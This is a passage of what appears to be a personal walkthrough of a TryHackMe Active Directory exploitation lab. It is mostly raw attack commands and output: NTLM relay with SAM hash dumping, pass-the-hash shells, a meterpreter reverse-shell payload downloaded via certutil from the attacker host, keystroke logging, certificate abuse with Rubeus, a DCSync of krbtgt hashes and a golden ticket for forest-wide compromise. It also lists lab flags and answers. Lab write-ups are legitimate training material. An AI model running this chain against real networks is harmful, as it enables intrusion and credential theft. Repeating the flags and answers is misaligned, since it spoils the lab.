[+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] load_ssl_context verify=True cert=None trust_env=True http2=False
[+] load_verify_locations cafile='/etc/ssl/certs/ca-certificates.crt'
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack DCSYNC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
[*] SMBD-Thread-5 (process_request_thread): Received connection from 10.200.129.202, attacking target smb://10.200.129.201
[*] Authenticating against smb://10.200.129.201 as ZA/THMSERVER2$ SUCCEED
[+] No more targets
[*] SMBD-Thread-7 (process_request_thread): Connection from 10.200.129.202 controlled, but there are no more targets left!
[+] No more targets
[*] SMBD-Thread-8 (process_request_thread): Connection from 10.200.129.202 controlled, but there are no more targets left!
[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[+] Retrieving class info for JD
[+] Retrieving class info for Skew1
[+] Retrieving class info for GBG
[+] Retrieving class info for Data
[*] Target system bootKey: 0x4e05e7ea4fdddde75aa56010474948dc
[+] Saving remote SAM database
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[+] Calculating HashedBootKey from SAM
[+] NewStyle hashes is: True
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::
[+] NewStyle hashes is: True
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] NewStyle hashes is: True
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:92728d5173fc94a54e84f8b457af63a8:::
[+] NewStyle hashes is: True
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e96eab5f240174fe2754efc94f6a53ae:::
[+] NewStyle hashes is: True
trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:82b235ec0a4f0ffbefe0433737e2e177:::
[*] Done dumping SAM hashes for host: 10.200.129.201
[*] Stopping service RemoteRegistry

trevor.local:1001:aad3b435b51404eeaad3b435b51404ee:82b235ec0a4f0ffbefe0433737e2e177:::
ServerAdmin:500:aad3b435b51404eeaad3b435b51404ee:3279a0c6dfe15dc3fb6e9c26dd9b066c:::

┌──(kali㉿kali)-[~/TryHackMe/ExploitAD]
└─$ impacket-ntlmrelayx -smb2support -t smb://10.200.129.201 -c 'whoami /all' -debug
USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

+ Geting Flag3 
```bash
[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator.ZA\Desktop> cat flag3.txt
THM{Printing.Some.Shellz}
```
+ Open Sheel using Evil-WinRM
```bash
evil-winrm -i 10.200.129.201 -u ServerAdmin -H 3279a0c6dfe15dc3fb6e9c26dd9b066c
```


## Task 5  Exploiting AD Users
+ What application is used to open the kdbx credential database?`keepass`
+ What meterpreter command do we use to move from SYSTEM to user context?`migrate`
+ What is the password of the credential database?`Imreallysurenoonewillguessmypassword`
+ What is the value of the flag stored in the credential database?`THM{AD.Users.Can.Give.Up.Good.Secrets}`


+ Generate Payload using msfvenom
```bash
┌──(kali㉿kali)-[~/TryHackMe/ExploitAD]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.50.126.20 LPORT=1234 -f psh -o shell.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of psh file: 3229 bytes
Saved as: shell.ps1
```

+ Oneliner setup for msfconsole
```bash
┌──(kali㉿kali)-[~/TryHackMe/ExploitAD]
└─$ sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.50.126.20; set LPORT 1234; exploit"
```

+ Download the Payload and run it on evil-winrm
```bash
*Evil-WinRM* PS C:\Users\trevor.local\Documents> certutil.exe -urlcache -split -f http://10.50.126.20:81/shell.ps1
****  Online  ****
  0000  ...
  0c9d
CertUtil: -URLCache command completed successfully.
*Evil-WinRM* PS C:\Users\trevor.local\Documents> .\shell.ps1
2520
```
+ Check process from meterpreter
```bash
meterpreter > ps | grep "explorer"
Filtering on 'explorer'

Process List
============

 PID   PPID  Name          Arch  Session  User                     Path
 ---   ----  ----          ----  -------  ----                     ----
 3804  3788  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe

meterpreter > migrate 3804
[*] Migrating from 4128 to 3804...
[*] Migration completed successfully.
meterpreter > getuid
Server username: THMSERVER1\trevor.local

meterpreter > keyscan_start
Starting the keystroke sniffer ...

meterpreter > keyscan_dump
Dumping captured keystrokes...
keep<CR>
<Shift>Imreallysurenoonewillguessmypassword<CR>
```

## Task 6  Exploiting GPOs
+ What object allows users to configure Windows policies?`Group Policy Objects`
+ What AD feature allows us to configure GPOs for the entire AD structure?`Group Policy Management`
+ What is the name of the GPO that our compromised AD account owns?`Management Server Pushes`
+ What is the value of the flag stored on THMSERVER2 in the Administrator's Desktop directory (flag4.txt)?`THM{Exploiting.GPOs.For.Fun.And.Profit}`

```bash
svcServMan:Sup3rStr0ngPass!@
runas /netonly /user:za.tryhackme.loc\svcServMan cmd.exe
```
+ After Setting GPO Remote to THMSERVER2 and get the flag
```bash
C:\Users\Administrator\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 1634-22A9

 Directory of C:\Users\Administrator\Desktop

06/16/2022  10:35 AM    <DIR>          .
06/16/2022  10:35 AM    <DIR>          ..
06/16/2022  06:48 PM                39 flag4.txt
06/16/2022  10:35 AM           104,407 templates.txt
               2 File(s)        104,446 bytes
               2 Dir(s)  51,950,628,864 bytes free

C:\Users\Administrator\Desktop>type flag4.txt
THM{Exploiting.GPOs.For.Fun.And.Profit}
```

## Task 7  Exploiting Certificates
+ What does the user create to ask the CA for a certificate?`certificate signing request`
+ What is the name of Microsoft's PKI implementation? `Active Directory Certificate Services`
+ What is the value of the flag stored on THMDC in the Administrator's Desktop directory (flag5.txt)?`THM{AD.Certs.Can.Get.You.DA}`

### Step to 
+ On RDP THMSERVER2 use MMC To create certificate and then export the certificate 
+ Run Rubeus to ask TGT and TGS
```bash
C:\Tools>Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\Users\alice.howard\Desktop\dodol.pfx /password:dodol /outfile:administrator.kirbi /domain:za.tryhackme.loc /dc:10.200.129.101

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype aes256_cts_hmac_sha1 and subject: CN=Dodol
[*] Building AS-REQ (w/ PKINIT preauth) for: 'za.tryhackme.loc\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

[*] Ticket written to administrator.kirbi


  ServiceName              :  krbtgt/za.tryhackme.loc
  ServiceRealm             :  ZA.TRYHACKME.LOC
  UserName                 :  Administrator
  UserRealm                :  ZA.TRYHACKME.LOC
  StartTime                :  1/25/2024 4:59:22 AM
  EndTime                  :  1/25/2024 2:59:22 PM
  RenewTill                :  2/1/2024 4:59:22 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  a2f07aA5rqipn+eBTG0tjFGg4AyN62gB22BBjo2NZe8=
  ASREP (key)              :  D3FD1F70D22261350840D6C4CDC2DA56638DF90192DC68FBCF19998E5345986B
```

+ After that run mimikatz to generate Tiket
```bash
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # kerberos::ptt administrator.kirbi

* File: 'administrator.kirbi': OK
```
+ Read The Flag5.txt
```bash
C:\Tools>dir \\THMDC.za.tryhackme.loc\c$\
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
05/01/2022  08:11 AM               169 dns_entries.csv
09/15/2018  07:19 AM    <DIR>          PerfLogs
03/21/2020  08:31 PM    <DIR>          Program Files
03/21/2020  08:28 PM    <DIR>          Program Files (x86)
05/01/2022  08:17 AM             1,725 thm-network-setup-dc.ps1
04/25/2022  06:13 PM    <DIR>          tmp
06/14/2022  02:13 PM    <DIR>          Users
04/25/2022  06:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  07:12 PM    <DIR>          Windows
               3 File(s)          1,997 bytes
               7 Dir(s)  51,445,276,672 bytes free

C:\Tools>type \\THMDC.za.tryhackme.loc\c$\Users\Administrator\Desktop\flag5.txt
THM{AD.Certs.Can.Get.You.DA}
```

## Task 8  Exploiting Domain Trusts
+ What domain trust relationship is by default configured between a parent and a child domain?`directional trust`
+ What is the name of the AD account used by the KDC to encrypt and sign TGTs?`krbtgt`
+ What is the name of the TGT that grants access to resources outside of our current domain?`inter-realm tgt`
+ What is the value of the flag stored on THMROOTDC in the Administrator's Desktop folder (flag6.txt)?`THM{Full.EA.Compromise}`

### Step to 
```bash
C:\Tools>mimikatz_trunk\x64\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # lsadump::dcsync /user:za\krbtgt
[DC] 'za.tryhackme.loc' will be the domain
[DC] 'THMDC.za.tryhackme.loc' will be the DC server
[DC] 'za\krbtgt' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 4/25/2022 6:18:22 PM
Object Security ID   : S-1-5-21-3885271727-2693558621-2658995185-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 16f9af38fca3ada405386b3b57366082
    ntlm- 0: 16f9af38fca3ada405386b3b57366082
    lm  - 0: 35c7b671efe40860dc078afd2786c902

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 4bf7050f5f09f6d59a8699081d9ed432

* Primary:Kerberos-Newer-Keys *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9b52d4ffae227e50025574e4347783ee4f4f6c01c110b1ad4c715d0c977558ca
      aes128_hmac       (4096) : c893fd72ddf7fe2ee545f52b8368602f
      des_cbc_md5       (4096) : d904d37f8ab6fed6

* Primary:Kerberos *
    Default Salt : ZA.TRYHACKME.LOCkrbtgt
    Credentials
      des_cbc_md5       : d904d37f8ab6fed6

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  59ef8461b2d3808973106d3eae741ca6
    02  e7e04d83662aa1f0e23058bf822db70c
    03  738f9c03bbcfe61e0cc1f617a56ee1ca
    04  59ef8461b2d3808973106d3eae741ca6
    05  e7e04d83662aa1f0e23058bf822db70c
    06  cf5bf42182aaaa694a6ca51ab2346e97
    07  59ef8461b2d3808973106d3eae741ca6
    08  7943328089ebb9cd6856cb93e1c8e5eb
    09  7943328089ebb9cd6856cb93e1c8e5eb
    10  703d09859f5291a805f35efce9b2de4d
    11  7ec84ffce154f8c3576c5ccfe270e306
    12  7943328089ebb9cd6856cb93e1c8e5eb
    13  09fcdbe4d28a7e845c4f7df0f5b942aa
    14  7ec84ffce154f8c3576c5ccfe270e306
    15  9f5d5af22548a18694bb8886e2f6a0eb
    16  9f5d5af22548a18694bb8886e2f6a0eb
    17  8d0eff223c176f71093f9d03f8a307df
    18  f5d27cfa462b19d062670445682aef8c
    19  3329d0412509cfe735c064d303dd05dc
    20  7b5fb40e95c2fb16b5b92843158e83af
    21  17a9bb9485f780cbe33945fc581532a2
    22  17a9bb9485f780cbe33945fc581532a2
    23  340490cea65bf6b5927cdf51444ef524
    24  14fbfe8a903667e4901113f484711a62
    25  14fbfe8a903667e4901113f484711a62
    26  f67574e138db44d188d1e11b1f92a9d5
    27  fd72b74747a58338ccfe1bd6d3527445
    28  f9b2e0e39df0a0cbeffa119c03a87b9b
    29  33a0a6986ba90410cbe8b5751a982393
```

```bash
PS C:\Tools> Get-ADComputer -Identity "THMDC"

DistinguishedName : CN=THMDC,OU=Domain Controllers,DC=za,DC=tryhackme,DC=loc
DNSHostName       : THMDC.za.tryhackme.loc
Enabled           : True
Name              : THMDC
ObjectClass       : computer
ObjectGUID        : bd651750-782b-4b09-93b4-b5987ec7311b
SamAccountName    : THMDC$
SID               : S-1-5-21-3885271727-2693558621-2658995185-1001
UserPrincipalName :

PS C:\Tools> Get-ADGroup -Identity "Enterprise Admins" -Server thmrootdc.tryhackme.loc
DistinguishedName : CN=Enterprise Admins,CN=Users,DC=tryhackme,DC=loc
GroupCategory     : Security
GroupScope        : Universal
Name              : Enterprise Admins
ObjectClass       : group
ObjectGUID        : a23ae384-16e8-44d5-9b36-8173c4e0e5de
SamAccountName    : Enterprise Admins
SID               : S-1-5-21-3330634377-1326264276-632209373-519



mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt
User      : Administrator
Domain    : za.tryhackme.loc (ZA)
SID       : S-1-5-21-3885271727-2693558621-2658995185-1001
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;
ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt
Service   : krbtgt
Lifetime  : 1/25/2024 5:39:55 AM ; 1/22/2034 5:39:55 AM ; 1/22/2034 5:39:55 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ za.tryhackme.loc' successfully submitted for current session


C:\Tools>dir \\THMDC.za.tryhackme.loc\c$
 Volume in drive \\THMDC.za.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\THMDC.za.tryhackme.loc\c$

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
05/01/2022  08:11 AM               169 dns_entries.csv
09/15/2018  07:19 AM    <DIR>          PerfLogs
03/21/2020  08:31 PM    <DIR>          Program Files
03/21/2020  08:28 PM    <DIR>          Program Files (x86)
05/01/2022  08:17 AM             1,725 thm-network-setup-dc.ps1
04/25/2022  06:13 PM    <DIR>          tmp
06/14/2022  02:13 PM    <DIR>          Users
04/25/2022  06:11 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  07:12 PM    <DIR>          Windows
               3 File(s)          1,997 bytes
               7 Dir(s)  51,445,055,488 bytes free

C:\Tools>dir \\thmrootdc.tryhackme.loc\c$\
 Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows
 Volume Serial Number is 1634-22A9

 Directory of \\thmrootdc.tryhackme.loc\c$

01/04/2022  07:47 AM               103 delete-vagrant-user.ps1
09/15/2018  07:19 AM    <DIR>          PerfLogs
03/21/2020  08:31 PM    <DIR>          Program Files
03/21/2020  08:28 PM    <DIR>          Program Files (x86)
05/01/2022  07:42 AM                31 root_dns_entries.csv
05/01/2022  08:07 AM             1,767 thm-network-setup-dc.ps1
04/25/2022  04:50 PM    <DIR>          tmp
04/27/2022  06:54 AM    <DIR>          Users
04/25/2022  04:50 PM    <SYMLINKD>     vagrant [\\vboxsvr\vagrant]
04/27/2022  05:29 PM    <DIR>          Windows
               3 File(s)          1,901 bytes
               7 Dir(s)  51,475,447,808 bytes free

C:\Tools>type  \\thmrootdc.tryhackme.loc\c$\Users\Administrator\Desktop\flag6.txt
THM{Full.EA.Compromise}

```